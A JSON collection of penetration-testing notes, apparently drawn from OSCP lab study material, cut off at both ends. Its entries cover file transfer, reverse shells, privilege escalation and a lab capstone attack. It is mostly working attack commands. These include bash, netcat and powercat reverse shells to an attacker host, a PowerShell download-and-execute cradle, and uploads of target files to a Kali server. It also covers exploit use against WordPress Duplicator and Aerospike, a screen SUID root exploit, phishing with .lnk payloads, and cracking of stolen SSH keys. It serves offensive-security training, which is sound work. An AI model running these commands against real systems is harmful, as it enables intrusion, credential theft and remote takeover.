        "command": "iwr \\\\<kali_ip>\\SHARE\\WinPEAS.exe -o C:/Windows/Tasks/WinPEAS.exe"
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-Skill-Tool-Transfer.md"
  },
  {
    "id": "file_transfer_http_download",
    "category": "File Transfer",
    "title": "Transfer File from Target: Using HTTP Server with Upload (Kali)",
    "content": "Use a Python script like `SimpleHTTPServerWithUpload.py` on Kali to start an HTTP server that allows uploads (`python3 SimpleHTTPServerWithUpload.py 8000`). On the target, upload files via the browser GUI, PowerShell (`(New-Object System.Net.WebClient).UploadFile`), or `curl -F 'file=@...'`.",
    "tags": [
      "file_transfer",
      "download_from_target",
      "http_server",
      "python",
      "upload",
      "windows",
      "linux",
      "webclient",
      "curl"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "python3 SimpleHTTPServerWithUpload.py 8000"
      },
      {
        "language": "powershell",
        "command": "(New-Object System.Net.WebClient).UploadFile('http://<kali_ip>:8000', 'C:\\temp\\supersecret.txt')"
      },
      {
        "language": "powershell",
        "command": "curl -F 'file=@C:\\\\temp\\\\supersecret.txt' http://<kali_ip>:8000"
      },
      {
        "language": "bash",
        "command": "curl -F 'file=@/tmp/supersecret.txt' http://<kali_ip>:8000"
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-Skill-Tool-Transfer.md"
  },
  {
    "id": "file_transfer_smb_download",
    "category": "File Transfer",
    "title": "Transfer File from Target: Using SMB Server (Kali)",
    "content": "Start an SMB server on Kali (`impacket-smbserver -smb2support SHARE .`). On the Windows target, use `copy` to upload files from the target to the Kali SMB share (`copy C:\\file \\\\kali-ip\\SHARE\\file`).",
    "tags": [
      "file_transfer",
      "download_from_target",
      "smb_server",
      "impacket-smbserver",
      "windows",
      "copy",
      "unc_path"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "impacket-smbserver -smb2support SHARE ."
      },
      {
        "language": "powershell",
        "command": "copy C:\\temp\\supersecret.txt \\\\<kali_ip>\\SHARE\\supersecret.txt"
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-Skill-Tool-Transfer.md"
  },
  {
    "id": "capstone_enum_public_mailsrv1",
    "category": "Assembling the Pieces",
    "title": "Enumerating Public Network: MAILSRV1",
    "content": "Perform Nmap scan (`-sC -sV`) and Gobuster directory scan (`-x txt,pdf,config`) on the MAILSRV1 machine (192.168.241.242).",
    "tags": [
      "lab",
      "capstone",
      "enumeration",
      "nmap",
      "gobuster",
      "windows"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "sudo nmap -sC -sV -oN mailsrv1/nmap <target_ip>"
      },
      {
        "language": "bash",
        "command": "gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config"
      }
    ],
    "related_cves": [],
    "source_file": "20-Assembling the Pieces.md"
  },
  {
    "id": "capstone_enum_public_websrv1",
    "category": "Assembling the Pieces",
    "title": "Enumerating Public Network: WEBSRV1 (WordPress)",
    "content": "Perform Nmap scan (`-sC -sV`). Identify WordPress (`whatweb`). Use `wpscan` to enumerate plugins (`--enumerate p --plugins-detection aggressive`). Find vulnerable `duplicator` plugin. Use `searchsploit` to find exploit.",
    "tags": [
      "lab",
      "capstone",
      "enumeration",
      "nmap",
      "wordpress",
      "whatweb",
      "wpscan",
      "plugin",
      "duplicator",
      "searchsploit"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "sudo nmap -sC -sV -oN websrv1/nmap <target_ip>"
      },
      {
        "language": "bash",
        "command": "whatweb http://<target_ip>"
      },
      {
        "language": "bash",
        "command": "wpscan --url http://<target_ip> --enumerate p --plugins-detection aggressive -o websrv1/wpscan"
      },
      {
        "language": "bash",
        "command": "searchsploit duplicator"
      }
    ],
    "related_cves": [],
    "source_file": "20-Assembling the Pieces.md"
  },
  {
    "id": "capstone_attack_public_websrv1_foothold",
    "category": "Assembling the Pieces",
    "title": "Attacking Public Machine (WEBSRV1): Initial Foothold",
    "content": "Download exploit for Duplicator plugin (e.g., `50420.py`). Use the exploit (`python3 50420.py ... <file_path>`) to read `/etc/passwd` (identify users `daniela`, `marcus`) and SSH private keys (`/home/user/.ssh/id_rsa`). Crack the passphrase for `daniela`'s key using `ssh2john` and `john`. Login via SSH (`ssh -i id_rsa daniela@...`).",
    "tags": [
      "lab",
      "capstone",
      "attack",
      "wordpress",
      "duplicator",
      "exploit",
      "lfi",
      "ssh_keys",
      "ssh2john",
      "john",
      "password_cracking",
      "ssh"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "searchsploit -m 50420"
      },
      {
        "language": "bash",
        "command": "python3 50420.py http://<target_ip> /etc/passwd"
      },
      {
        "language": "bash",
        "command": "python3 50420.py http://<target_ip> /home/daniela/.ssh/id_rsa"
      },
      {
        "language": "bash",
        "command": "ssh2john id_rsa > id_rsa.hash"
      },
      {
        "language": "bash",
        "command": "john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash"
      },
      {
        "language": "bash",
        "command": "ssh -i id_rsa daniela@<target_ip>"
      }
    ],
    "related_cves": [],
    "source_file": "20-Assembling the Pieces.md"
  },
  {
    "id": "capstone_attack_public_websrv1_privesc",
    "category": "Assembling the Pieces",
    "title": "Attacking Public Machine (WEBSRV1): Privilege Escalation & Recon",
    "content": "On `daniela` shell, use `linpeas.sh` for enumeration. Find `sudo git` NOPASSWD entry. Use GTFOBins technique for `git` (`sudo git -p help config`, then `!/bin/bash`) to get root shell. Also find DB password in WordPress config and a `.git` repository (`/srv/www/wordpress/.git`). Examine git log (`git show <commit_id>`), find leaked domain credentials (`john:dqsTwTpZPn#nL`).",
    "tags": [
      "lab",
      "capstone",
      "attack",
      "linux",
      "privesc",
      "linpeas",
      "sudo",
      "git",
      "gtfobins",
      "wordpress",
      "git_log",
      "credential_hunting"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "sudo git -p help config"
      },
      {
        "language": "bash",
        "command": "!/bin/bash"
      },
      {
        "language": "bash",
        "command": "git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1"
      }
    ],
    "related_cves": [],
    "source_file": "20-Assembling the Pieces.md"
  },
  {
    "id": "capstone_internal_access_creds_phishing",
    "category": "Assembling the Pieces",
    "title": "Gaining Internal Access: Creds & Phishing",
    "content": "Validate the leaked domain creds (`john:dqsTwTpZPn#nL`) against MAILSRV1 using `crackmapexec smb`. Prepare a phishing attack using Windows Library (`.Library-ms`) and Shortcut (`.lnk`) files. Set up WebDAV (`wsgidav`) and HTTP (`python3`) servers on Kali. Create `.Library-ms` pointing to WebDAV and `.lnk` containing a `powercat` reverse shell payload. Send email with `.Library-ms` attached using `swaks`. Start `nc` listener. Receive reverse shell as `beyond\\marcus` on CLIENTWK1 (internal machine).",
    "tags": [
      "lab",
      "capstone",
      "attack",
      "crackmapexec",
      "smb",
      "phishing",
      "client_side",
      "library-ms",
      "lnk",
      "webdav",
      "wsgidav",
      "powercat",
      "reverse_shell",
      "swaks",
      "nc"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "crackmapexec smb <target_ip> -u usernames.txt -p passwords.txt --continue-on-success"
      },
      {
        "language": "bash",
        "command": "wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ./webdav/"
      },
      {
        "language": "powershell",
        "command": "powershell.exe -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://<kali_ip>:8000/powercat.ps1');powercat -c <kali_ip> -p 4444 -e powershell\""
      },
      {
        "language": "bash",
        "command": "sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server <target_ip> --body @body.txt --header \"Subject: Staging Script\" --suppress-data -ap"
      },
      {
        "language": "bash",
        "command": "nc -lvnp 4444"
      }
    ],
    "related_cves": [],
    "source_file": "20-Assembling the Pieces.md"
  },
  {
    "id": "capstone_internal_enum_sharphound_bloodhound",
    "category": "Assembling the Pieces",
    "title": "Enumerating Internal Network: SharpHound/BloodHound",
    "content": "On the reverse shell (CLIENTWK1), use `ipconfig` to identify internal network range (172.16.197.0/24). Run `winPEAS.exe` for initial recon. Download `SharpHound.ps1`, import it (`powershell -ep bypass`, `. .\\SharpHound.ps1`), and run data collection (`Invoke-BloodHound -CollectionMethod All`). Download the resulting zip file to Kali. Import into `BloodHound`. Analyze users (`beccy` is Domain Admin), computers (DCSRV1, INTERNALSRV1, MAILSRV1, CLIENTWK1), active sessions (`beccy` on MAILSRV1), and kerberoastable users (`krbtgt`, `daniela`).",
    "tags": [
      "lab",
      "capstone",
      "enumeration",
      "active_directory",
      "ad",
      "winpeas",
      "sharphound",
      "bloodhound",
      "invoke-bloodhound",
      "kerberoasting"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "iwr -uri http://<kali_ip>:8000/SharpHound.ps1 -Outfile SharpHound.ps1"
      },
      {
        "language": "powershell",
        "command": "powershell.exe -ep bypass"
      },
      {
        "language": "powershell",
        "command": ". .\SharpHound.ps1"
      },
      {
        "language": "powershell",
        "command": "Invoke-BloodHound -CollectionMethod All"
      }
    ],
    "related_cves": [],
    "source_file": "20-Assembling the Pieces.md"
  },
  {
    "id": "oscpa_crystal_enum_foothold",
    "category": "LAB-OSCPA",
    "title": "Crystal (Linux): Enum & Foothold",
    "content": "Nmap reveals FTP, SSH, HTTP. Gobuster finds `.git/HEAD`. Dump git repo (`git-dumper`), find DB creds (`stuart@challenge.lab / BreakingBad92`). SSH as `stuart` succeeds.",
    "tags": [
      "lab",
      "oscpa",
      "linux",
      "crystal",
      "nmap",
      "gobuster",
      "git",
      "git-dumper",
      "credential_hunting",
      "ssh"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "git-dumper http://<target_ip>/.git/ ./Crystal/git-dumper"
      },
      {
        "language": "bash",
        "command": "ssh stuart@<target_ip>"
      }
    ],
    "related_cves": [],
    "source_file": "LAB-OSCPA.md"
  },
  {
    "id": "oscpa_crystal_privesc",
    "category": "LAB-OSCPA",
    "title": "Crystal (Linux): Privilege Escalation",
    "content": "Run `linpeas.sh`. Find user `chloe` in `sudo` group (`getent group sudo`). Find password-protected `/opt/sitebackup3.zip`. Download zip, crack password (`zip2john`, `john`) -> `codeblue`. Extract zip, find Joomla password (`Ee24zIK4cDhJHL4H`) in `configuration.php`. Use `su - chloe` with this password. Gain root access via `sudo`.",
    "tags": [
      "lab",
      "oscpa",
      "linux",
      "crystal",
      "privesc",
      "linpeas",
      "sudo",
      "zip",
      "zip2john",
      "john",
      "password_cracking",
      "joomla",
      "su"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "zip2john sitebackup3.zip > zip2john.txt"
      },
      {
        "language": "bash",
        "command": "john --wordlist=/usr/share/wordlists/rockyou.txt zip2john.txt"
      },
      {
        "language": "bash",
        "command": "su - chloe"
      }
    ],
    "related_cves": [],
    "source_file": "LAB-OSCPA.md"
  },
  {
    "id": "oscpa_hermes_foothold",
    "category": "LAB-OSCPA",
    "title": "Hermes (Windows): Foothold (WiFi Mouse RCE)",
    "content": "Nmap reveals FTP, HTTP, SMB, RDP, and port 1978 (Unisql/WiFi Mouse). Find exploit for WiFi Mouse 1.7.8.5 (`searchsploit -m 49601`). Create reverse shell payload (`msfvenom`). Use exploit (`python2 49601.py ...`) to execute payload and get shell.",
    "tags": [
      "lab",
      "oscpa",
      "windows",
      "hermes",
      "nmap",
      "wifi_mouse",
      "rce",
      "exploit",
      "searchsploit",
      "msfvenom",
      "reverse_shell"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "searchsploit -m 49601"
      },
      {
        "language": "bash",
        "command": "msfvenom -p windows/shell_reverse_tcp LHOST=<kali_ip> LPORT=4444 -f exe > thmouse.exe"
      },
      {
        "language": "bash",
        "command": "python2 49601.py <target_ip> <kali_ip> thmouse.exe"
      }
    ],
    "related_cves": [],
    "source_file": "LAB-OSCPA.md"
  },
  {
    "id": "oscpa_hermes_privesc",
    "category": "LAB-OSCPA",
    "title": "Hermes (Windows): Privilege Escalation (Putty Session)",
    "content": "Run `winpeas.exe`. Find saved Putty session for user `zachary` (Administrator group) containing plaintext password (`Th3R@tC@tch3r`). RDP as `zachary` to get proof.",
    "tags": [
      "lab",
      "oscpa",
      "windows",
      "hermes",
      "privesc",
      "winpeas",
      "putty",
      "credential_hunting",
      "rdp"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "LAB-OSCPA.md"
  },
  {
    "id": "oscpa_aero_foothold",
    "category": "LAB-OSCPA",
    "title": "Aero (Linux): Foothold (Aerospike RCE CVE-2020-13151)",
    "content": "Nmap reveals multiple ports including 3003 (cgms/Aerospike). Use `nc` to connect and check version (`Aerospike Community Edition build 5.1.0.1`). Find exploit for CVE-2020-13151 (`python3 cve2020-13151.py ...`). Get reverse shell as `aero`.",
    "tags": [
      "lab",
      "oscpa",
      "linux",
      "aero",
      "nmap",
      "aerospike",
      "rce",
      "cve",
      "exploit",
      "reverse_shell"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "nc -nv <target_ip> 3003"
      },
      {
        "language": "bash",
        "command": "python3 cve2020-13151.py --ahost=<target_ip> --pythonshell --lhost=<kali_ip> --lport=443"
      }
    ],
    "related_cves": [
      "CVE-2020-13151"
    ],
    "source_file": "LAB-OSCPA.md"
  },
  {
    "id": "oscpa_aero_privesc",
    "category": "LAB-OSCPA",
    "title": "Aero (Linux): Privilege Escalation (Screen SUID)",
    "content": "Use `find / -perm -4000` to find SUID binary `/usr/bin/screen-4.5.0`. Find exploit for this version (`screen-v4.5.0-priv-escalate`). Compile exploit on Kali. Transfer exploit files (`libhax.so`, `rootshell`) to target (`/tmp`). Run exploit steps (`cd /etc`, `umask 000`, `screen -D -m -L ld.so.preload ...`, `/tmp/rootshell`) to get root.",
    "tags": [
      "lab",
      "oscpa",
      "linux",
      "aero",
      "privesc",
      "suid",
      "screen",
      "exploit",
      "ld_preload"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "find / -perm -4000 -type f 2>/dev/null"
      },
      {
        "language": "bash",
        "command": "screen -D -m -L ld.so.preload echo -ne \"\\x0a/tmp/libhax.so\""
      },
      {
        "language": "bash",
        "command": "/tmp/rootshell"
      }
    ],
    "related_cves": [],
    "source_file": "LAB-OSCPA.md"
  },
  {
    "id": "rce_kali_setup",
    "category": "RCE",
    "title": "RCE: Kali Listener Setup",
    "content": "On the attacking machine (Kali), use `rlwrap nc -lvnp 4444` as the default listener for reverse shells. To upgrade a basic shell to a more interactive TTY shell, use `python3 -c 'import pty; pty.spawn(\"/bin/bash\")'`. Refer to revshells.com for various reverse shell payloads.",
    "tags": [
      "rce",
      "reverse_shell",
      "listener",
      "nc",
      "netcat",
      "rlwrap",
      "tty",
      "python"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "rlwrap nc -lvnp 4444"
      },
      {
        "language": "bash",
        "command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-Skill-RCE.md"
  },
  {
    "id": "rce_nc_exe",
    "category": "RCE",
    "title": "RCE: Using nc.exe / nc",
    "content": "Execute `nc.exe` (Windows) or `nc` (Linux) on the target machine to connect back to the Kali listener and provide a shell (`cmd.exe` or `/bin/bash`).",
    "tags": [
      "rce",
      "reverse_shell",
      "nc",
      "netcat",
      "windows",
      "linux"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "nc.exe <kali_ip> 4444 -e cmd.exe"
      },
      {
        "language": "bash",
        "command": "nc <kali_ip> 4444 -e /bin/bash"
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-Skill-RCE.md"
  },
  {
    "id": "rce_powershell",
    "category": "RCE",
    "title": "RCE: Using PowerShell",
    "content": "On Windows targets, use PowerShell for reverse shells. Download and execute `powercat.ps1` or use a base64 encoded PowerShell command (`powershell -e Base64String`).",
    "tags": [
      "rce",
      "reverse_shell",
      "powershell",
      "windows",
      "powercat",
      "base64"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "powershell.exe -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://<kali_ip>:8000/powercat.ps1');powercat -c <kali_ip> -p 4444 -e powershell\""
      },
      {
        "language": "powershell",
        "command": "powershell -e Base64String"
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-Skill-RCE.md"
  },
  {
    "id": "rce_bash",
    "category": "RCE",
    "title": "RCE: Using Bash",
    "content": "On Linux targets, use bash redirection to create a reverse shell connection to the Kali listener.",
    "tags": [
      "rce",
      "reverse_shell",
      "bash",
      "linux",
      "tcp_redirection"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "bash -c 'bash -i >& /dev/tcp/<kali_ip>/4444 0>&1'"
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-Skill-RCE.md"
  },
  {
    "id": "rce_webshells",
    "category": "RCE",
    "title": "RCE: Using Webshells",
    "content": "Webshells (PHP, ASP, etc.) can provide RCE depending on the web server technology. Many examples are available online or locally on Kali in `/usr/share/webshells/`.",
    "tags": [
      "rce",
      "webshell",
      "php",
      "asp",
      "aspx",
      "jsp"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "ZNote-Skill-RCE.md"
  },
  {
    "id": "rce_notes",
    "category": "RCE",
    "title": "RCE: Important Notes",
    "content": "On Windows shells, the PATH variable might need to be set manually (`set PATH=%PATH%C:\\Windows\\System32;...`) to run commands. Use `powershell -ep bypass` to potentially circumvent execution policies. Files on an SMB share can sometimes be executed directly (`\\\\kali-ip\\SHARE\\nc.exe ...`) without needing to transfer them first.",
    "tags": [
      "rce",
      "windows",
      "path_variable",
      "powershell",
      "executionpolicy_bypass",
      "smb",
      "remote_execution"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "set PATH=%PATH%C:\\Windows\\System32;C:\\Windows\\System32\\WindowsPowerShell\\v1.0;"
      },
      {
        "language": "powershell",
        "command": "powershell -nop -ep bypass"
      },
      {
        "language": "bash",
        "command": "\\\\<kali_ip>\\SHARE\\nc.exe <kali_ip> 4444 -e cmd.exe"
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-Skill-RCE.md"
  },
  {
    "id": "initial_nmap",
    "category": "Initial Foothold",
    "title": "Initial Approach: Nmap Scanning",
    "content": "Start by scanning the target with Nmap to identify open ports and services (`sudo nmap -sC -sV -p- -T4 -oA <output_base> <target_ip>`). Consider adding `-Pn` if ping is blocked or using scripts like `--script=vuln`. `RustScan` or `Autorecon` can be alternatives.",
    "tags": [
      "initial_foothold",
      "enumeration",
      "scanning",
      "nmap",
      "rustscan",
      "autorecon"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "sudo nmap -sC -sV -p- -T4 -oA nmap-result <target_ip>"
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-First-to-Target-Scanning-Enum-Attack.md"
  },
  {
    "id": "initial_http_enum",
    "category": "Initial Foothold",
    "title": "Initial Approach: Analyzing HTTP Services",
    "content": "Access web services identified by Nmap. Use tools like `whatweb` or `wappalyzer` to identify technologies. Use `gobuster` or `ffuf` for directory/file discovery. Scan specific CMS like WordPress (`wpscan`) or Joomla (`joomscan`). Look for sensitive info in hidden paths, especially `.git` repos (use `git-dumper`, `gitleaks`). Search for known exploits for identified technologies (`searchsploit`, Google, GitHub). Manually test for common web vulnerabilities (SQLi, Command Injection, File Upload, LFI/RFI, Path Traversal) that could lead to RCE. Check login pages for default credentials or brute-force possibilities.",
    "tags": [
      "initial_foothold",
      "enumeration",
      "web",
      "http",
      "whatweb",
      "wappalyzer",
      "gobuster",
      "ffuf",
      "wpscan",
      "joomscan",
      "git",
      "searchsploit",
      "sqli",
      "command_injection",
      "file_upload",
      "lfi",
      "rfi"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -t 50"
      },
      {
        "language": "bash",
        "command": "wpscan --url http://<target_ip> --enumerate ap,at,tt,cb,dbe --api-token YOUR_API_TOKEN"
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-First-to-Target-Scanning-Enum-Attack.md"
  },
  {
    "id": "initial_ssh_enum",
    "category": "Initial Foothold",
    "title": "Initial Approach: Analyzing SSH Service",
    "content": "Check the identified SSH version for known vulnerabilities. Attempt login with default credentials or perform brute-force if feasible.",
    "tags": [
      "initial_foothold",
      "enumeration",
      "ssh",
      "brute_force"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "ZNote-First-to-Target-Scanning-Enum-Attack.md"
  },
  {
    "id": "initial_ftp_enum",
    "category": "Initial Foothold",
    "title": "Initial Approach: Analyzing FTP Service",
    "content": "Try logging in with `anonymous` or default credentials. If successful, list files/directories and search for sensitive information. If write access is available, try uploading a shell (`put shell.php`). Use `get <file>` to download files.",
    "tags": [
      "initial_foothold",
      "enumeration",
      "ftp",
      "anonymous_ftp",
      "file_transfer",
      "webshell"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "put shell.php"
      },
      {
        "language": "bash",
        "command": "get pass.txt"
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-First-to-Target-Scanning-Enum-Attack.md"
  },
  {
    "id": "initial_smb_enum",
    "category": "Initial Foothold",
    "title": "Initial Approach: Analyzing SMB Service",
    "content": "Check the SMB version for vulnerabilities. Attempt null session login (`smbclient -N -L \\\\<ip>`) or default credentials. Use enumeration tools like `enum4linux` and `crackmapexec smb`. If write access is found, try uploading a shell. SMB commands are similar to FTP for file operations.",
    "tags": [
      "initial_foothold",
      "enumeration",
      "smb",
      "null_session",
      "enum4linux",
      "crackmapexec",
      "file_transfer"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "smbclient -N -L \\\\<target_ip>"
      },
      {
        "language": "bash",
        "command": "enum4linux <target_ip>"
      },
      {
        "language": "bash",
        "command": "crackmapexec smb <target_ip>"
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-First-to-Target-Scanning-Enum-Attack.md"
  },
  {
    "id": "initial_ldap_enum",
    "category": "Initial Foothold",
    "title": "Initial Approach: Analyzing LDAP/LDAPS Service",
    "content": "Use `ldapsearch` to query the LDAP server. Start with anonymous binds (`-x`) to list objects. Specify the base DN (`-b \"dc=...\"`) and filter (`\"(objectClass=...)\"`) to find users, groups, computers, etc. If credentials are known (`-D \"user\" -w \"pass\"`), try querying for sensitive attributes like LAPS passwords (`ms-MCS-AdmPwd`).",
    "tags": [
      "initial_foothold",
      "enumeration",
      "ldap",
      "ldaps",
      "ldapsearch",
      "anonymous_bind",
      "laps"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "ldapsearch -x -H ldap://<target_ip> -b \"dc=example,dc=com\" \"(objectClass=*)\""
      },
      {
        "language": "bash",
        "command": "ldapsearch -H ldap://<target_ip> -x -b \"dc=hutch,dc=offsec\" \"(objectClass=person)\" | grep -E \"sAMAccountName|description\""
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-First-to-Target-Scanning-Enum-Attack.md"
  },
  {
    "id": "initial_other_services_enum",
    "category": "Initial Foothold",
    "title": "Initial Approach: Analyzing Other Services",
    "content": "Uncommon services found by Nmap are potential targets; search Google/exploit databases for vulnerabilities related to the service name and version. If database services (MySQL, MS-SQL) are found, try connecting using default or discovered credentials.",
    "tags": [
      "initial_foothold",
      "enumeration",
      "exploit_search",
      "database",
      "mysql",
      "mssql"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "mysql -u root -p -h <target_ip> -P 3306"
      },
      {
        "language": "bash",
        "command": "impacket-mssqlclient <user>:<pass>@<target_ip> -windows-auth"
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-First-to-Target-Scanning-Enum-Attack.md"
  },
  {
    "id": "winprivesc_manual_enum_basic",
    "category": "Windows Privilege Escalation",
    "title": "WinPrivesc Manual Enum: Basic Info",
    "content": "Gather initial system and user information using built-in commands: `whoami`, `whoami /groups`, `net user`, `Get-LocalUser`, `net localgroup`, `Get-LocalGroupMember`, `systeminfo`, `ipconfig /all`, `netstat -ano`, `Get-ItemProperty` (for installed apps via Uninstall registry key), `Get-Process`.",
    "tags": [
      "windows",
      "privesc",
      "enumeration",
      "manual_enum",
      "whoami",
      "net_user",
      "systeminfo",
      "get-process"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "whoami /groups"
      },
      {
        "language": "powershell",
        "command": "Get-LocalGroupMember adminteam"
      },
      {
        "language": "powershell",
        "command": "Get-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" | select displayname"
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-Windows-Privileges.md"
  },
  {
    "id": "winprivesc_manual_enum_sensitive_files",
    "category": "Windows Privilege Escalation",
    "title": "WinPrivesc Manual Enum: Sensitive Files",
    "content": "Search recursively for files that might contain credentials or sensitive configuration using `Get-ChildItem`: KeePass databases (`*.kdbx`), configuration/text files (`*.txt`, `*.ini`), user documents (`*.pdf`, `*.xls*`, `*.doc*`), specific config files (e.g., `C:\\xampp\\mysql\\bin\\my.ini`).",
    "tags": [
      "windows",
      "privesc",
      "enumeration",
      "manual_enum",
      "sensitive_files",
      "get-childitem",
      "credential_hunting",
      "kdbx"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue"
      },
      {
        "language": "powershell",
        "command": "Get-ChildItem -Path C:\\Users\\dave\\ -Include *.txt,*.pdf,*.xls*,*.doc* -File -Recurse -ErrorAction SilentlyContinue"
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-Windows-Privileges.md"
  },
  {
    "id": "winprivesc_manual_enum_pshistory_logs",
    "category": "Windows Privilege Escalation",
    "title": "WinPrivesc Manual Enum: PowerShell History & Logs",
    "content": "Check PowerShell command history using `(Get-PSReadlineOption).HistorySavePath` to find the history file path, then view its content (`type C:\\Users\\...\\ConsoleHost_history.txt`). Also, check Event Viewer logs for PowerShell Script Block Logging (Event ID 4104) which might contain passwords or sensitive commands.",
    "tags": [
      "windows",
      "privesc",
      "enumeration",
      "manual_enum",
      "powershell",
      "powershell_history",
      "get-psreadlineoption",
      "event_viewer",
      "script_block_logging",
      "event_id_4104"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "(Get-PSReadlineOption).HistorySavePath"
      },
      {
        "language": "powershell",
        "command": "type C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-Windows-Privileges.md"
  },
  {
    "id": "winprivesc_manual_enum_installation_autologon",
    "category": "Windows Privilege Escalation",
    "title": "WinPrivesc Manual Enum: Installation Rights & Autologon",
    "content": "Check Windows Installer policies via registry (`reg query ...\\Installer`) to see if unrestricted installation is allowed (value=1), potentially allowing malicious installers. Check Winlogon registry keys (`reg query ...\\Winlogon`) for potential autologon credentials.",
    "tags": [
      "windows",
      "privesc",
      "enumeration",
      "manual_enum",
      "windows_installer",
      "registry",
      "autologon"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer"
      },
      {
        "language": "powershell",
        "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\""
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-Windows-Privileges.md"
  },
  {
    "id": "winprivesc_manual_enum_password_loot",
    "category": "Windows Privilege Escalation",
    "title": "WinPrivesc Manual Enum: Password Looting",
    "content": "Look for stored credentials using `cmdkey /list`. Search the registry for keys containing 'password' (`reg query HKLM /f password ...`, `reg query HKCU /f password ...`). Check common configuration files like `desktop.ini` and `unattend.xml`.",
    "tags": [
      "windows",
      "privesc",
      "enumeration",
      "manual_enum",
      "credential_hunting",
      "cmdkey",
      "registry",
      "unattend.xml"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "cmdkey /list"
      },
      {
        "language": "powershell",
        "command": "reg query HKCU /f password /t REG_SZ /s"
      },
      {
        "language": "powershell",
        "command": "type unattend.xml"
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-Windows-Privileges.md"
  },
  {
    "id": "winprivesc_manual_enum_runas",
    "category": "Windows Privilege Escalation",
    "title": "WinPrivesc Manual Enum: Runas",
    "content": "If credentials for another user (e.g., found via `cmdkey` or file searching) are obtained, use `runas /user:<username> cmd` to open a command prompt as that user. The `/savecred` option can store the password for future use. Can be used to execute reverse shells (`runas /user:admin \"nc.exe ...\"`).",
    "tags": [
      "windows",
      "privesc",
      "enumeration",
      "manual_enum",
      "runas",
      "lateral_movement"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "runas /user:backupadmin cmd"
      },
      {
        "language": "powershell",
        "command": "runas /savecred /user:admin cmd"
      },
      {
        "language": "powershell",
        "command": "runas /user:administrator \"nc.exe -e cmd.exe <kali_ip> 443\""
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-Windows-Privileges.md"
  },
  {
    "id": "winprivesc_insecure_service_permissions",
    "category": "Windows Privilege Escalation",
    "title": "WinPrivesc Vector: Insecure Service Permissions",
    "content": "Check permissions (`icacls`, `Get-Acl`) on service executables (`Get-CimInstance win32_service`). If a service running as a high-privilege user (e.g., LocalSystem) has a binary that a low-privilege user can write to, replace the binary with a payload (e.g., adduser.exe compiled with mingw-w64). Restart the service (or reboot if needed and possible via `whoami /priv` -> `shutdown /r`) to trigger the payload.",
    "tags": [
      "windows",
      "privesc",
      "service_exploitation",
      "binary_hijacking",
      "insecure_permissions",
      "icacls",
      "get-acl",
      "mingw-w64"
    ],
    "code_snippets": [
      {
        "language": "powershell",
